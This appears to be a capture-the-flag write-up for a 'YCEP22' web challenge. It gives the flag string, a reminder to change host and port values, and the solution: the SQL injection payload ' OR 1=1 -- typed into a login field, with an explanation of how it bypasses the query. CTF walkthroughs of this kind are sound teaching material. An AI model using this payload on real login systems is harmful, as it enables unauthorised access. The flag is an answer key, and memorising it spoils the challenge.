DOCtor SHARK said that I had to take an injection YOU WILL NEVER TAKE ME ALIVE!!
http://<ip.address>/index.html

YCEP22{1_hAt3_SQL_iNj3Ct10ns}

remember to change these values:
host, port, conn



Solution: ' OR 1=1 -- 

it is given that the SQL statement run is 

SELECT * FROM users WHERE username='' and password=''

this can be highjacked by injecting into either the username or password field
as the server does not check for SQL injection keywords 
(except for DELETE, INSERT and other stuff that can destroy the chall)

statement becomes:
SELECT * FROM users WHERE username='' OR 1=1 -- ' password=''
SELECT * FROM users WHERE true